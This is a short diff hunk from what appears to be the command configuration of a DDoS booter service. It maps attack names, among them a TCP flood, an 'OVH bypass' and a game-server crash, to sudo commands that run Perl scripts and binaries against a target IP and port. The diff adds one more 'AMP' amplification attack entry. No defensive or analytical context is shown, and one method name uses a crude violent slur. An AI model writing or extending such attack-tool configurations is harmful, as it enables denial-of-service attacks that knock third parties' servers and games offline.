@@ -43,3 +43,5 @@ TCP_NUKE : sudo perl TCP_VOX.pl %ip% 9999
 OVH-RAPE : sudo perl OVHBYPASS.pl %ip% %port% 9999
 
 GAME : sudo ./GAME-CRASH %ip% %port%
+
+AMP : sudo perl amp.pl %ip% %port% 5500 9999
